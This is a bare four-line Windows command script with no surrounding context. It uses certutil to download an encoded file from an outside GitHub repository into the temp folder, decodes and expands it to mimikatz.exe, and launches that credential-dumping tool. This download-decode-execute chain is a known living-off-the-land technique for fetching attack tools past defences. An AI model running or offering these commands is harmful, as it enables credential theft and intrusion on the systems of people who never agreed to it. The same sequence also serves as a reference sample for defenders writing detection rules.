certutil -urlcache -split -f https://github.com/inwestallis/first_repository/raw/master/mim.b %Temp%\mim.b
certutil -decode %Temp%\mim.b %Temp%\mim
expand %Temp%\mim %Temp%\mimikatz.exe
start %Temp%\mimikatz.exe
